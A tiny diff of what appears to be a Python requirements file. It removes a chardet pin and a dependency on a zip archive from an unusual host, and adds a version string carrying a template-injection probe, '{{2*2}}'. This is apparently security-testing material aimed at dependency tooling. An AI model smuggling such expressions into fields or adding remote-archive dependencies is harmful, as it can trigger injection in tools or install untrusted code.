@@ -1,2 +1,1 @@
-chardet==3.0.4
-https://snyk.t1.windows-analytics.com/test.zip
+chardet==3.0.{{2*2}}
